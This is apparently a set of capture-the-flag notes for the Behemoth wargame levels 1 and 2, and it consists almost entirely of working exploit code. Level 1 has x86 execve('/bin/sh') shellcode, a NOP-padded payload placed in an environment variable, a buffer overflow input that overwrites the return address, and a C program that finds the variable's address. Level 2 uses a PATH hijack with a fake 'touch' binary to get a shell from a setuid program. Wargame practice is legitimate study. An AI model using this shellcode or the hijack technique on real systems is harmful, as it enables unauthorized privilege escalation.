## Behemoth 1

```asm
; nasm -gstabs -f elf32 -o bin_sh.o bin_sh.asm && ld bin_sh.o -m elf_i386 -s -o bin_sh && ./bin_sh
; objdump -M Intel -d ./bin_sh |grep '[0-9a-f]:'|grep -v 'file'|cut -f2 -d:|cut -f1-7 -d' '|tr -s ' '|tr '\t' ' '|sed 's/ $//g'|sed 's/ /\\\x/g'|paste -d '' -s |sed 's/^/"/'|sed 's/$/"/g'

section .text
    global _start
_start:
    xor eax, eax ; make eax = 0
    push eax ; push 0 to stack
    push "//sh" ; tanda garing di belakang berfungsi agar tidak ada null byte saat membuat payload
    push "/bin" ; push /bin/sh to stack
    mov ebx, esp ; mov /bin/sh to ebx
    mov ecx, eax ; make ecx 0
    mov edx, eax ; make edx 0
    mov al, 0xb ; execve
    int 0x80 ; syscall

    push ecx ; push 0 on the stack
    mov al, 1 ; exit
    int 0x80
```

```sh
x/20s *((char **)environ) # in gdb to print env address and value
```

```sh
export EXPLOIT=$(python -c "print '\x90'*10+'\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x89\xc1\x89\xc2\xb0\x0b\xcd\x80\x51\xb0\x01\xcd\x80'+'\x90'*10")
```

```sh
run < <(python -c 'print "\x90"*71+"\xf4\xde\xff\xff"')
```

```c
#include <stdio.h>
#include <stdlib.h>

int main(int argc, char *argv[]) {
	char* ptr = getenv("EXPLOIT");
	printf("%p\n",ptr);
}
```

### Reference
- http://shell-storm.org/shellcode/files/shellcode-811.php
- https://stackoverflow.com/questions/55941924/why-was-nop-assigned-to-0x90-in-x86-assembly



## Behemoth 2

```
...snip...
   0x080485f3 <+136>:   push   eax
   0x080485f4 <+137>:   call   0x8048410 <system@plt>
...snip...
```

```
eax = 0xffffd684:     "touch 29161" ; eax in function main+136
```

```sh
mkdir /tmp/mal
echo "/bin/sh" > /tmp/mal/touch
chmod +x /tmp/mal/touch
export PATH=/tmp/mal:$PATH
/behemoth/behemoth2
```